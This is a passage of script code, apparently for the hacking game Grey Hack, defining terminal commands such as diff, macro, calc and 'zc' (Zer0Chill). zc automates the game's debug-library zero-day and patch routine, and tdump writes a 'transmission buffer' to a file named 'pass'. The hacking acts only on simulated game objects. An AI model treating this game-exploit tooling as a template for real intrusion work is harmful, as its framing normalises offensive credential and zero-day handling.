		return output.join(char(10)).trim
	end function

	delim = null
	in_list = null
	if typeof(arg1) == "number" then return str(arg1)
	if typeof(arg1) == "list" and typeof(arg2) == "list" then 
		print colorLightBlue+"Returning concatenated list..."
		return arg1 + arg2
	end if
	if typeof(arg1) == "list" then in_list = arg1  
	use_regex = false 
	// if arg1 == "-R" then
	// 	use_regex = true 
	// 	arg1 = "-r"
	// end if
	if typeof(arg1) == "string" then 
		if arg1 == "-N" then return _no_parse_input(arg2)
		if arg1 == "-p" then return _strip_input(arg2)
		if arg1 == "-t" then return _trim_input(arg2)
		if arg1 == "-L" then return _to_int_list(arg2,arg3)
		if arg1 == "-l" then return _to_list(arg2,arg3)
		if arg1 == "-i" then return _to_int(arg2)
		if arg1 == "-v" then return _to_val(arg2)
		if arg1 == "-r" then return _handle_replacement(arg2,arg3,arg4)
		if arg1 == "-R" then return _handle_replacement(arg2,"",arg3)
		if arg1 == "-n" then delim = char(10) // "/n"
		if arg1 == "-c" then delim = char(44) // ","
		if arg1 == "-C" then delim = char(58)   // ":"
		if arg1 == "-s" then delim = char(59)   // ";"
		if arg1 == "-S" then delim = " "   // i forgot the char code for spaces " "
		if arg2 and typeof(arg2) == "list" then in_list = arg2 else return "string: 2nd param after flag should be a list" 
		if not delim then return "string: invalid option. check usage."
	end if
	if not in_list then return "string: expects list"
	if not delim then delim = char(10)
	return in_list.join(delim)
end function
command.diff = function(input_1,input_2,arg3,arg4)

    // the diff function
    _diff = function(block_1, block_2,ret_type="string")
		print colorRed+"--diff--"
        if typeof(block_1) != "string" or typeof(block_2) != "string" then return "error: expected string string, got: "+typeof(block_1)+" and "+typeof(block_2)
        diff_list = []
		print_buffer = []
        i = 0
        j = 0
        lines1 = block_1.split(char(10))
        lines2 = block_2.split(char(10))
		leng1 = lines1.len 
        leng2 = lines2.len 
		if DEBUG then print "debug: len_1_1: "+lines1.len+" len_2_2: "+lines2.len
        while i < leng1 or j < leng2 
            if i < leng1 and j < leng2 then 
				if DEBUG then print "debug: diff: top of loop"
                if lines1[i] == lines2[j] then 

                    print_buffer.push((i+1)+"<color=#00ff88ff>"+char(177)+(j+1)+" "+lines1[i])
					i = i + 1
					j = j + 1
                else 
					print_buffer.push(colorRed+(i+1)+CT+"<color=#D9FF00ff>- "+lines1[i])
                    print_buffer.push(colorRed+(j+1)+CT+"<color=#fc7324ff>+ "+lines2[j])
					diff_list.push(i+1)
					j = j + 1
					if j < lines2.len then 
						if lines1[i] != lines2[j] then i = i + 1 // this is a hack for compatibility with zero day stuff, make it better
					else 
						i = i + 1
						if DEBUG then print "processed line "+ i
					end if            		
                end if  
            else 
                if i < leng1 then 
					if DEBUG then print "file_1 is longer by "+ (i-j)
                    print_buffer.push("<color=#D9FF00ff>"+(i+1)+"- "+lines1[i])
					if lines1[i] != "" then diff_list.push(i+1)
                else 
                    if j < leng2 then 
						if DEBUG then print "file_2 is longer by "+(j-i)
                        print_buffer.push("<color=#fc7324ff>"+(j+1)+"+ "+lines2[j])
						if lines2[j] != "" then diff_list.push(j+1)
                    end if
               end if
				i = i + 1
            	j = j + 1
            end if
			if DEBUG then print "debug: diff: bottom of loop"
        end while
        if ret_type == "string" then 
			return print_buffer.join(char(10))
		else 
			print print_buffer.join(char(10))
			return diff_list
		end if
    end function
/////////////////////////////////////////START HERE///////////////////////////////////////////////////
	// preprocess input
	return_type = "string"
	if input_1 == "-l" then 
		return_type = "list"
		input_1 = input_2 
		input_2 = arg3 
		arg3 = arg4
	end if
    // usage info
	if not input_1 or not input_2 then return "Usage: diff [opt] [input_1] [input_2]"
    if input_1 == "-h" or input_1 == "help" then return "<u><b>DIFF || DIFFERENCES || FILE COMPARE || TEXT COMPARE"+char(10)+char(10)+
    "Usage: diff [input_1] [input_2] -- standard diff tool"+char(10)+
    "Usage: diff [file_1_path|file_1_object|text_block_1] [file_2_path|file_2_object|text_block_2]"+char(10)+
    "-- compares <b>text</b> of input_1 to input_2 and prints output"+char(10)+
    "-- prints differences when encountered"+char(10)+
    "-- input_1 text is prepended with the <b>-</b> character"+char(10)+
    "-- input_2 text is prepended with the <b>+</b> character"+char(10)+char(10)+
    "Input notes:"+char(10)+
    ":: if input_1 or input_2 are single words they are processed as <b>paths to a file"+char(10)+
    ":: if input_2 or input_2 are more than one word (ie piped text) they are processed as strings"+char(10)+
    ":: does not process binary files or lists"+char(10)+
	":: -- for lists pipe the output of <b>string [yourlist]"+char(10)+char(10)+
	"Advanced: diff [-l] [input1] [input2] -- returns a list of ints corresponding to line numbers with differences"+char(10)+
	"-- useful for <b>unit_testing</b> a debugLibrary"
    // postprocess input
    if typeof(input_1) == "string" then 
        if input_1.split(" ").len == 1 then input_1 = globals.get_file(input_1)
        if not input_1 then return "diff: "+input_1+" not found"
    end if
    if typeof(input_2) == "string" then 
        if input_2.split(" ").len == 1 then input_2 = globals.get_file(input_2)
        if not input_2 then return "diff: "+input_2+" not found"
    end if 
    if typeof(input_1) == "file" then 
        if input_1.is_binary then return "diff: unable to open binary file: "+input_1.path
        if not input_1.has_permission("r") then return "diff: unable to read "+input_1.path
        input_1 = input_1.get_content
    end if
    if typeof(input_2) == "file" then 
        if input_2.is_binary then return "diff: unable to open binary file: "+input_2.path        
        if not input_2.has_permission("r") then return "diff: unable to read "+input_2.path
        input_2 = input_2.get_content
    end if
	if DEBUG then print "debug: top of diff"
	if DEBUG then print "debug: input_1: "+input_1
	if DEBUG then print "<b>debug: input_1 leng: "+input_1.len
	if DEBUG then print "debug: input_2: "+input_2 
	if DEBUG then print "<b>debug: input_2 leng: "+input_2.len
    return _diff(input_1,input_2,return_type)
end function
command["if"] = function(arg1,arg2,arg3,arg4)
	if @arg1 == "help" or @arg1 == "-h" then return "IF || if statement || conditionals"+char(10)+
	"Usage: if [positive_return] [negative_return] [condition_1] [condition_2] -- a binary if statement"+char(10)+
	"-- compares condition_1 to condition_2"+char(10)+
	"-- returns positive_return if equal"+char(10)+
	"-- returns negative_return if not-equal"+char(10)+
	"-- conditions and returns may be any data type"+char(10)+
	"NOTE: functions as returns are returned by function reference"+char(10)+
	"-- pipe to code for execution"+char(10)+
	"-- functions as conditions are executed in place"+char(10)+
	"---- it is not (currently) possible to pass parameters to these functions"+char(10)+
	"NOTE: any parameter may be a command, with parameters, if:"+char(10)+
	"-- the first word of the string is a command name"+char(10)+
	"-- the string itself is surrounded by floating single quotes"+char(10)+
	"--eg: <b>file -r /etc | clipa |  | if "" echo true "" "" echo false "" @a "" grep -f etc  "" "+char(10)+
	"-- which would result in <b>true</b> printing to the screen (provided etc actually existed)"
	s = @command["shell"]
	res = 0
	print colorCyan+"<u>= = = evaluating = = =</u>"+char(10)
	print colorRed+"<u><size=75%>"+CT+@arg3
	if typeof(@arg3) == "string" and globals.command.hasIndex(arg3.split(char(32))[0]) then arg3 = s(arg3+" | return",1)
	print colorRed+"<u><size=75%>"+CT+@arg4
	if typeof(@arg4) == "string" and globals.command.hasIndex(arg4.split(char(32))[0]) then arg4 = s(arg4+" | return",1)
	print "<size=75%><u>"+colorCyan+"Result:"
	if arg3 == arg4 then
		if typeof(@arg1) == "string" and globals.command.hasIndex(arg1.split(char(32))[0]) then res = s(arg1+" | return") else res = @arg1
	else 
		if typeof(@arg2) == "string" and globals.command.hasIndex(arg2.split(char(32))[0]) then res = s(arg2+" | return") else res = @arg2
	end if
	//if @res isa string then return res.trim else return @res
	return @res
end function
command.sl = function(arg1,arg2,arg3,arg4)
	if not arg1 or arg1 == "help" or arg1 == "-h" then return "Symlink || symbolic link || file path"+char(10)+
	"Usage: sl [path] -- returns true if path is a symlink, returns false otherwise"+char(10)+
	"Usage: sl [path] [/new_path/new_name] -- create a symbolic link at path"+char(10)+
	"-- returns 1 on success, string on fail"+char(10)
	if typeof(arg1) == "file" then arg1 = arg1.path
	if typeof(arg1) != "string" then return "sl: invalid path"
	source_file = globals.get_file(arg1)
	if not source_file then return "sl: source file not found"
	if not arg2 then 
		print colorCyan+"sl:"+colorLightBlue+" checking for symlink..."
		if source_file.is_symlink then return "true" else return "false" 
	end if
	sym_name = null
	sym_parent_path = null 
	first = globals.get_file(arg2)
	if first then 
		if first.is_symlink then 
			print "sl: destination symlink exists; overwriting"
			sym_name = first.name 
			sym_parent_path = first.parent.path 
		else 
			print "sl: destination exists and is not a symlink;"+char(10)+"-- aborting..."
			return 0
		end if
	else
		sym_path = arg2.split("/")
		sym_name = sym_path.pop
		if sym_path.len < 1 then sym_path = sym_path + currentPath.split("/")
		sym_path = sym_path.join("/")
		second = globals.get_file(sym_path)
		if second and second.is_folder then sym_parent_path = second.path else return "sl: [original_file] [/parent_path/new_name]"
	end if
	print colorLightBlue+"<u>sl: "+colorCyan+"creating symlink:</b> "+source_file.path+" ~> "+sym_parent_path+"/"+sym_name
	return source_file.symlink(sym_parent_path, sym_name)
end function
command.zc = function(neurobox_user,neurobox_pass,metalib,patch_it=0)
    if neurobox_user == "h" or neurobox_user == "help" then return "Zer0Chill || Zeroday || zero day || autopatcher || autosolver"+char(10)+
	colorWhite+"Usage: zc [neurobox_username] [neurobox_password] [opt:metaLib_name|metaLib_object]"+char(10)+
	"-- if a MetaLib is not supplied, zc will use the currently linked MetaLib"+char(10)+
	"---- or return an error if one is not linked"+char(10)+
	"-- zc will: obtain debugLibrary from a MetaLib"+char(10)+
	"---- scan the debugLibrary and parse the output"+char(10)+
	"---- construct a patched version of the output"+char(10)+
	"---- write the original and patched versions to:"+char(10)+
	"------ <b>orig</b> and <b>patch.zd</b>, respectively"+char(10)+
	"---- BUFFER all of the above"+char(10)+
	"NOTE: at this time lib patching is not automated"+char(10)+
	"NOTE: at this time unit-testing is not automated"+char(10)+
	"----: this is because both of these actions may result in a lock-out"+char(10)+
	"----: please analyze the output and unit-test and patch carefully"+char(10)+
	colorWhite+"- - - - - - - - -"+char(10)+
	colorLightBlue+"DebugLibary Unit Testing:"+char(10)+
	"Procedure: once <b>zc</b> has been run:"+char(10)+
	"-- run the command:<b> diff -l orig patch.zd | clipa | malp"+char(10)+
	"-- select the debugLibrary from the BUFFER"+char(10)+
	"-- select option [2] - unit_testing"+char(10)+
	"-- input <b>@a</b> to use the list stored in clipa"+char(10)+
	"-- if successful, output string will be BUFFERED"+char(10)+
	"-- select the output text from the BUFFER"+char(10)+
	"-- select [s] - save and enter a filename for the zeroday data"+char(10)+
	colorLightBlue+"MetaLib Patching:"+char(10)+
	"Procedure: once <b>zc</b> and unit_testing are complete:"+char(10)+
	"-- select the debugLibrary from the BUFFER "+char(10)+
	"-- select patch and enter the path to patch.zd"+char(10)+
	"-- you may also use the <b>code</b> command: "+char(10)+
	"--eg: <b>code @B [#]</b> -- where # is the index of the debugLibrary in the BUFFER"
    if not neurobox_user or not neurobox_pass then return "zer0Chill: invalid parameters: expects [user] [pass] [metaLib]"
    if typeof(metalib) != "MetaLib" then 
        if typeof(metalib) == "string" then 
            if not globals.metaxploit then return "zer0Chill: metaxploit is required in order to load from path"
			print command.meta(metalib)        
            metalib = command.bios("-m")
            if typeof(metalib) != "MetaLib" then return "zer0Chill: error: that wasn't a MetaLib!" else globals.BUFFER.push(metalib)
        else 
			if not metalib then 
				if globals.metaLib then 
					metalib = globals.metaLib
					globals.BUFFER.push(metalib)
				else 
					return "zer0Chill: please supply or link a metaLib name or object"
				end if
			else 
				return "zer0chill: please supply or link a metaLib name or metaLib object"
			end if
        end if
    else 
        command.meta(metalib)    
        globals.BUFFER.push(command.bios("-m"))
    end if
    handle = {}
    handle.output = []
    handle.some_var = ""
    handle.scan_string = ""
    handle.orig_code = ""
    handle.corr_code = ""
    handle.zeroday = ""
    handle.objects = [] // metaLib, debugLibrary, list_of_line_numbers
    handle.test = function( list, debuglib )
        zero_day = debuglib.unit_test(list)
        print colorGold+"Processing..."
        if zero_day == null then return "zer0Chill: unit_test failed: invalid input"
        if zero_day == "Test failed: No errors have been found in one or more of the provided lines, or not all lines with errors have been provided." then return zero_day
        print colorWhite+"Success. Sending result to BUFFER"
        globals.BUFFER.push(zero_day)
        print "zer0Cill: task complete, returning result:"
        return zero_day
    end function
    handle.patch = function( debugLibrary, patch_path )
        act = debugLibrary.apply_patch( patch_path )
		print act
    end function
    handle.The = function( f, v ) // create a new function, create it's first line, determine it's param from that line
        handle.output.push(f+" = function("+v+")")
    end function
    handle.If = function( string ) // [If] the value of var_pkPc3t is greater than or equal to 5,...
        valu = string.split("value of")[1].split("is")[0].trim // var_pkPc3t
        statement = string.split(", ")[0].split("is")[1].trim // greater than or equal to 5
        if DEBUG then print "processing statement: "+statement
        line = "if "+valu+" "+handle._maths(statement)+" then" // if var_pkPc3t >= 5 then
        handle.output.push(line)
        // ...then updates var_pkPc3t by calculating var_pkPc3t plus 6
        next_line = string.split(", ")[1].split("calculating ")[1].split(" ") // var_pkPc3t plus 6
        var = next_line.pull 
        const = next_line.pop 
        op = next_line.join(" ")
        if op == "plus" then op = "+"
        if op == "minus" then op = "-"
        if op == "divided by" then op = "/"
        if op == "multiplied by" then op = "*"
        line = var+" = "+var+" "+op+" "+const // var_pkPc3t = var_pkPc3t + 6
        handle.output.push(line)
        handle.output.push("end if")
    end function
    handle.For = function( string ) // [For] each i from 0 to 2, updates var_pkPc3t by multiplying it by i
        lines = string.split(", ")
        line1 = lines[0]
        line2 = lines[1]

        range_min = line1.split("from ")[1].split(" to ")[0] // 0
        range_max = line1.split("from ")[1].split(" to ")[1] // 2
        var = line2.split(" by ")[0].split(" ")[1] // var_pkPc3t
        op = var+" = i * "+var
        handle.output.push("for i in range("+range_min+", "+range_max+")")
        handle.output.push(op)
        handle.output.push("end for")
    end function
    handle.calculates = function( string ) // [calculates] var_pkPc3t minus 1
        input = string.split(" ")
        v = input.pull
        const = input.pop 
        op = input.join(" ").trim
        if op == "plus" then op = "+"
        if op == "minus" then op = "-"
        if op == "divided by" then op = "/"
        if op == "multiplied by" then op = "*"
        handle.output.push(v+" = "+v+" "+op+" "+const)
    end function
    handle.calls = function( string ) // calls the function func_oEHEM4 with var_pkPc3t.
        line = string.split("function ")[1].split(" ")
        func = line[0]
        var = line[-1]
        handle.output.push(var+" = "+func+"("+var+")")
    end function
    handle.creates = function( string ) // creates a list var_nDHyNB, adds var_Znm6qW to var_nDHyNB, and assigns var_Znm6qW to the first element of var_nDHyNB.
        line1 = string.split(", ")[0]
        list = line1.split("list ")[1]
        line2 = string.split(", ")[1]
        v = line2.split(" ")[1]
        handle.output.push(list+" = []")
        handle.output.push( list+".push("+v+")")
        handle.output.push(v+" = "+list+"[0]")
    end function
    handle.Finally = function( string ) // [returns] something
        ret_v = string.split(" ")[-1]
        line = "return "+ret_v 
        handle.output.push(line)
        handle.output.push("end function")
        handle.output.push("")
    end function
    handle._maths = function( string )
        st = string.split(" ")
        v = st.pop
        st = st.join(" ").trim
        op = ""
        if DEBUG then print "in _maths: st is:"+st
        if st == "greater than or equal to" then return ">= "+v
        if st == "greater than" then return "> "+v
        if st == "less than" then return "< "+v
        if st == "less than or equal to" then return "<= "+v
        if st == "equal to" then return "== "+v
        if st == "not equal to" then return "!= "+v
        if op == "" then return "<b>unknown operation!</b> "+v
    end function
    handle.write_patch = function( list, file )
        out = list.join(char(10))
        return file.set_content(out)
    end function
    handle._parse = function( string )
        sl = string.split(" ")
        first_word = sl.pull.replace(",","")
        if first_word == "The" then 
            if DEBUG then print "creating new function..."
            sl.pull 
            f_name = sl.pull 
            if DEBUG then print f_name
            handle.The(f_name,handle.some_var)
            first_word = sl.pull.replace(",","")
        end if
        ins = sl.join(" ")
        yadda = ""
        if DEBUG then print "looking for index: "+first_word
        if handle.hasIndex(first_word) then yadda = @handle[first_word] else return 0 // fix this
        yadda(sl.join(" "))
        return 1
    end function
    handle.export = function( string )
        print "zer0Chill: sending code snippet to BUFFER"
        globals.BUFFER.push(string)
        file = globals.get_file(currentPath+"/orig")
        if not file then print command.poke(currentPath+"/orig")
        file = globals.get_file(currentPath+"/orig")
        if not file then print "zer0Chill: unable to locate or create "+currentPath+"/orig"
        print "zer0Chill: writing original code snippet to "+file.path
        if file.has_permission("w") then file.set_content(string) else print "write failed: permission denied"
    end function 
    handle._refactor = function( string )
        //print string
        arr = string.split(char(10))
        //print arr
        out_b = []
        for line in arr
            sl = line.split(":")
            if sl.len > 1 then out_b.push(sl[1].trim)
        end for
        handle.export( out_b.join(char(10)) )
    end function
    handle._split_strings = function( string )
        if DEBUG then print "debug: string to split:"+char(10)+string
        instructions = string[:string.indexOf("01:")].trim.remove("Potential problems have been found in the following code:")
        original_code = string[string.indexOf("01:"):]
        return [ instructions, original_code ]
    end function
    handle._heuristics = function()
        success = 0
        debug_lib = metalib.debug_tools(neurobox_user,neurobox_pass)
        if typeof(debug_lib) != "debugLibrary" or debug_lib == "Incorrect password" then return [ success, debug_lib ]
        output = ""
        output = debug_lib.scan 


        success = 1    
        return [ success, output, debug_lib ]
    end function
    ///////////////////////////////////////////////////////////////////////////////////    
    handle.zero_pwn = function( string ) 
        handle.some_var = string.split("returns")[-1].replace("\.","").trim
        chunk = string.replace(char(10),"").split("\.")
        
        if DEBUG then print "Found some var: "+handle.some_var
        for line in chunk
            if DEBUG then print "processing line: "+line
            handle._parse(line.trim)
        end for

        output_file = globals.get_file(currentPath+"/patch.zd")
        if not output_file then print command.poke(currentPath+"/patch.zd")
        output_file = globals.get_file(currentPath+"/patch.zd")
        if not output_file then 
			print "zer0Chill: could not find or create patch.zd in current path"+char(10)+"-- <b>patch not written to file!"
		else
			if not output_file.has_permission("w") then 
                print "zer0Chill: patch.zd is write protected"+char(10)+"-- <b>patch not written to file!"
            else
                print "zer0Chill: writing patch file to: <b>"+output_file.path+char(10)+"-- status: ["+handle.write_patch(handle.output, output_file)+"]"
				
            end if
        end if
        print "zer0Chill: returning output..."
        return handle.output.join(char(10))
    end function
    ///////////////////////////////////////////////////////////////////////////////
    print "Launching Zer0Chill v 0.3..."
    hl = handle._heuristics // returns list
    h=""
    if not hl[0] then return hl[1] else h = hl[1]
    if DEBUG then print "debug: big string is:"+char(10)+h+char(10)
    print colorOrange+"zer0Chill: sending debugLibrary to BUFFER"
    globals.BUFFER.push(hl[2])
    print colorOrange+"-- sending debug string to BUFFER"
    globals.BUFFER.push(h)
    s = handle._split_strings(h) // returns list
    handle._refactor(s[1])
    return handle.zero_pwn(s[0])
end function
command.macro = function(arg1,arg2,arg3,arg4)
	if arg1 == "help" or arg1 == "-h" then return "<u>macro || alias || auto || variable || global"+char(10)+
	"* A macro allows you to define a set of actions commands to execute using a single command."+char(10)+
	"* Use floating quotes to wrap the chain of commands and type them as you would normally on the CLI."+char(10)+
	"* Macro's are essentially 'on the fly' do scripts that are stored in the custom object."+char(10)+
	"* You may retrieve a macro from the custom object (for piping, or whatever) with<b> get [macro_name]."+char(10)+
	"* You may pipe a <b>do</b> script into a macro. A do script may execute a macro with: <b>do # [macro_name]."+char(10)+
	"* This makes the two interchangeable, allowing you to choose the exact behavior you want performed."+char(10)+
	colorCyan+"</b>Usage: macro [-s|set] [name] [string] -- set a macro to the given string"+char(10)+
	"-- eg: macro -s foo "" echo bar | clipa """+char(10)+
	"-- escape ez_clip aliases with <b>\</b> when defining a macro"+char(10)+
	"----eg: <b>macro set foo "" echo \@b "" "+char(10)+
	"---- will use the value in @b when the macro is executed instead of when it is defined"+char(10)+
	colorCyan+"</b>Usage: macro [name] [opt: input_to_pipe] -- fire the named macro, the macro prepend is <b>optional"+char(10)+
	colorGold+"</b>NOTE: All macros may be fired from the command line by typing the macro name"+char(10)+
	"-- this includes using macros within a string of piped commands"+char(10)+
	"--eg: |> <b>macro -s gotime "" echo it's go time """+char(10)+
	"----: |> <b>echo three | echo two | echo one | gotime | echo "" what time is it? """+char(10)+
	"-- see the Piping section below for the [input_to_pipe] details"+char(10)+
	colorWhite+"Note: a macro chain will return the <b>final</b> output of the chain"+char(10)+
	colorCyan+"</b>Usage: macro [-d|del] [name] -- delete the named macro"+char(10)+
	"-- eg: macro -d foo"+char(10)+
	colorCyan+"</b>Usage: macro [-l|list] -- show all macros and their definitions"+char(10)+
	"-- all macros are stored in the macro registry map: get_custom_object.macros"+char(10)+
	colorCyan+"Usage: macro [-g|get] [macro] -- return the macro string of the given macro"+char(10)+char(10)+
	colorGreen+"</b>NOTE: invoking the macro command will restore the macro registry index"+char(10)+
	"--: this will avoid a crash if the index is accidentally removed"+char(10)+
	colorGreen+"</b>NOTE: a macro will return the output of the last command in the chain"+char(10)+
	char(10)+
	colorCyan+"Piping: "+colorWhite+"when calling a macro, piping works differently than normal."+char(10)+
	colorWhite+"When creating a macro you may place one or more "+colorCyan+"@pipe"+CT+"<b> pointers within the string."+char(10)+
	colorWhite+"When calling a macro, the "+colorCyan+"@pipe"+CT+"<b> pointer will be replaced by piped input."+char(10)+
	colorGold+"Example: input not piped vs input piped"+char(10)+
	colorWhite+"|> "+colorGreen+"macro set foo "" echo foo """+char(10)+
	colorWhite+"--output of: |>"+colorOlive+" foo bar</b> ==> foo"+char(10)+
	colorWhite+"|> "+colorGreen+"macro set foo "" echo foo "+colorCyan+"@pipe</color> """+char(10)+
	colorWhite+"--output of: |>"+colorOlive+" foo bar</b> ==> foo bar"+char(10)+
	colorWhite+"-- ""bar"" would be the [input_to_pipe] to the first command in the macro chain"+char(10)+
	colorWhite+"Note: <b>each instance of "+colorCyan+"@pipe</color> will be replaced by the piped input"+char(10)+
	colorWhite+"Note: you may escape "+colorCyan+"@pipe</color> with "+colorCyan+"\@pipe</color>"+char(10)+
	colorWhite+"N.B. -- remember that ["+colorCyan+"\@pipe | @pipe</color>] goes in the "+colorCyan+"macro set</color> string"+char(10)+
	colorWhite+"---- not in the macro call"+char(10)+
	colorGreen+"See Also: do -h, help conventions, help alias, help automation"+char(10)
	if not arg1 then return "Usage: macro [name] [opt: input_to_pipe]"+char(10)+"Usage: macro set [name] [string]"
	command.cob("validate")
	print colorCyan+"<size=75%><u>==========macro=========="
	gm = get_custom_object.macros
	nsm = "-- no such macro"
	if arg1 == "-g" or arg1 == "get" then 
		if arg2 and gm.hasIndex(arg2) then 
			return gm[arg2]
		else 
			return nsm
		end if
	end if		
	if arg1 == "-l" or arg1 == "list" then 
		mbuf = []
		for kv in gm 
			mbuf.push(colorCyan+"</b>"+kv.key+" </color>>> "+colorWhite+"</b>"+kv.value)
		end for
		return mbuf.join(char(10))
	end if 
	if arg1 == "del" or arg1 == "-d" then 
		// remove a macro
		if arg2 and gm.hasIndex(arg2) then 
			gm.remove(arg2)
			return colorCyan+"-- deleted: "+colorWhite+arg2
			//return command.cob("del",arg2)
		else 
			return nsm
		end if
	end if
	if arg1 == "set" or arg1 == "-s" then 
		// create a macro
		if typeof(@arg3) != "string" then return "-- [-s] flag expects [string:name] [string:value]"
		if gm.hasIndex(arg2) then print +colorOrange+"<size=75%>-- macro already exists;</b> overwriting"
		gm[arg2] = arg3
		if command.hasIndex(arg2) then print colorOrange+"<size=85%></b>Warning: macro shares the name of a command!"+char(10)+"<size=75%>-- the macro will be processed instead of the command"
		macs = arg3.split(" ")
		selfcall = false
		i = 0
		for m in macs 
			if m == arg2 then 
				selfcall = true
				macs[i] = colorRed+"</b>"+m+CT
				arg2 = colorRed+"</b>"+arg2+CT
			end if
			i = i + 1
		end for
		arg3 = macs.join(" ")
		if selfcall == true then print colorRed+"<size=75%>WARNING: possible infinite loop detected; "+char(10)+
		colorRed+"</b><size=75%>-- macro may contain a call to self"+char(10)+
		"<size=65%>-- <b>double check that is is not problematic"
		return colorCyan+"</b>-- registered: "+colorWhite+"</b>"+arg2+CT+" as "+colorWhite+"</b>"+arg3
	else 
		//fire a macro
		macmac = null
		silent = 1
		if arg1 == "-v" then 
			silent = 0 // verbose
			arg1 = arg2
		end if
		if gm.hasIndex(arg1) then macmac = gm[arg1] else return nsm
		if DEBUG then print "debug: macro chain: "+char(10)+macmac
		if typeof(macmac) != "string" then return colorOrage+"</b><size=75%>-- invalid macro; this looks more like an alias"
		//return command.shell(macmac.replace("@pipe",str(arg2)).replace(char(10)," |  | ")+" | return")	
		print "<size=75%>"+colorCyan+"</b>"+macmac.replace("@pipe",colorRed+"@pipe"+CT).replace("@",colorMagenta+"@"+CT)
		macmac = macmac+" | return".replace(char(10)," |  | ")
		macmac = macmac.split(" ")
		for ar in macmac 
			if ar == "@pipe" then macmac[macmac.indexOf(ar)] = arg2
		end for
		return command.shell(macmac,silent)	
	end if
	return 0
end function
command.tdump = function(arg1,arg2,arg3,arg4)
	if arg1 == "-h" or arg1 == "help" then return "Transmission Buffer Dump"+char(10)+"Usage: tdump [opt: path] -- dump tbuf (transmission buffer) to file"+char(10)+"-- writes to specified path or default path of home_directory+/pass"
	if globals.T_BUF.len <= 1 then return "Transmission buffer is empty."
	tpath = arg1 
	if not tpath then 
		if currentPath != "/" then tpath = currentPath + "/pass" else tpath = currentPath+"pass"
	end if
	print colorLightBlue+"dumping t_buf to: "+colorWhite+tpath
	passfile = globals.get_file(tpath)
	if not passfile then 
		print "tdump: "+tpath+" not found"
		print "poke: creating "+tpath
		print command.poke(tpath)
		passfile = globals.get_file(tpath)
		if not passfile then return "tdump: write permission denied"
	end if
	if typeof(passfile) != "file" then return "tdump: "+tpath+" not found. "+char(10)+"-- check path and glasspool status and try again."
	if not passfile.has_permission("w") then return "tdump: write permission denied"
	tcatch = passfile.set_content( globals.T_BUF.join(char(10)) ) 
	if DEBUG then print "debug: tcatch: "+tcatch+" is a "+ typeof(tcatch)
	if typeof(tcatch) == "string" then return tcatch else print colorLightBlue+"tdump: task complete..."
	globals.T_BUF = [(localip+"@"+pubip)]
	//globals.T_BUF = []
	print "tdump: returning file object for "+passfile.path
	return passfile
end function
command.calc = function(arg1="0", arg2="0", arg3="0", arg4=0)
	calc_help = function()
		return "calc [arg1] [arg2: + - * / (or: add, sub, mul, div)] [arg3] "+char(10)+"calc (a)sin/(a)cos/(a)tan/ [arg]"+char(10)+"calc pwr/abs/sqrt [arg]"+char(10)+"calc [min] rnd [max] |or| calc rnd [max]   (min=0)"+char(10)+"calc [arg1] pwr [arg2]"+char(10)+"calc [arg1] == [arg2] (check if equal.)"+char(10)+"Use pi to indicate pi. eg: calc pi || calc pi / 2 || calc cos pi || etc"+char(10)+"N.B. If an input is a function it will be evaluated"+char(10)+"-- EXCEPT when using the equals function (ie x == y)"+char(10)+"-- in this case function pointers will be compared."+char(10)+"You may use @a or @clipa, @b or @clipb, @c or @clipc to reference the clipboards."+char(10)+"-- ie calc @a + @b"+char(10)+"Returns: evaluation as string."+char(10)+"calc [n] base [p] -- retruns the [p].adic representation of the number to evaluate."+char(10)+"e.g. 42 base 2 -> 101010"
	end function
	if @arg1 == "-h" or @arg1 == "help" then return calc_help
	calc = {}
	 
	// p-adic representation
	calc.base = function(n, p) // expects int: value, int:prime (must be greater than 1)
		if p < 1 then exit("Invalid base. P must be geater than 1")
		p_adic_digits = []
		while n != 0
			quotient = null
			remainder = null
			res = divmod(n, p) // write divmod function, returns list
			quotient = res[0]
			remainder = res[1]
			p_adic_digits.push( remainder )
			n = quotient
		end while
		p_adic_digits = reverse( p_adic_digits ) // write a reverse function
		return p_adic_digits.join("") // returns list
	end function
	divmod = function( val, prime )
		result = []
		result.push( floor(val / prime) )
		result.push( val % prime )
		return result
	end function
	reverse = function( list_input )
		new_list = []
		while list_input.len > 0
			new_list.push( list_input.pop )
		end while
		return new_list
	end function
	
	calc.equals = function(a1,a3)
		if @a1 == @a3 then
			print("equal")
			return 1
		else
			print("not equal")
			return 0
		end if
	end function
	calc.add = function(a1,a3)
		return (a1 + a3)
	end function
	calc.sub = function(a1,a3)
		return (a1 - a3)
	end function
	calc.mul = function(a1,a3)
		return (a1 * a3)
	end function
	calc.div = function(a1,a3)
		return (a1 / a3)
	end function
	calc.cos = function(a1,a3)
		return cos(a1)
	end function
	calc.sin = function(a1,a3)
		return sin(a1)
	end function
	calc.tan = function(a1,a3)
		return tan(a1)
	end function
	calc.acos = function(a1,a3)
		return acos(a1)
	end function
	calc.asin = function(a1,a3)
		return asin(a1)
	end function
	calc.atan = function(a1,a3)
		return atan(a1)
	end function
	calc.sqrt = function(a1,a3)
		return sqrt(a1)
	end function
	calc.pwr = function(a1,a3)
		tm=1
		for i in range(1,a3)
			tm=(tm * a1)
		end for
		return tm
	end function
	calc.rnd = function(a1,a3=0)
		//if typeof(a1) != "number" then a1 = a1.to_int
		ran = range(a3, a1)
		ran.shuffle
		return ran[0]
		//return (floor((rnd * a3.val) + a1.val))
	end function
	calc.abs = function(a1,a3)
		return abs(a1)
	end function
	calc.pi = function(a1,a3)
		return "3.14159265358"
	end function
	if @arg1 == "@a" or @arg1 == "@clipa" then arg1 = @globals.CLIP["a"]
	if @arg1 == "@b" or @arg1 == "@clipb" then arg1 = @globals.CLIP["b"]
	if @arg1 == "@c" or @arg1 == "@clipc" then arg1 = @globals.CLIP["c"]
	if @arg2 == "@a" or @arg2 == "@clipa" then arg2 = @globals.CLIP["a"]
	if @arg2 == "@b" or @arg2 == "@clipb" then arg2 = @globals.CLIP["b"]
	if @arg2 == "@c" or @arg2 == "@clipc" then arg2 = @globals.CLIP["c"]
	if @arg3 == "@a" or @arg3 == "@clipa" then arg3 = @globals.CLIP["a"]
	if @arg3 == "@b" or @arg3 == "@clipb" then arg3 = @globals.CLIP["b"]
	if @arg3 == "@c" or @arg3 == "@clipc" then arg3 = @globals.CLIP["c"]
	if @arg2 == "==" then arg2 = "equals"
	if @arg1 == "pi" and @arg2 == 0 then return calc.pi
	if @arg1 == "pi" then arg1 = calc.pi
	if @arg2 == "pi" then arg2 = calc.pi
	if @arg3 == "pi" then arg3 = calc.pi
	if @arg2 == "+" then arg2 = "add"
	if @arg2 == "-" then arg2 = "sub"
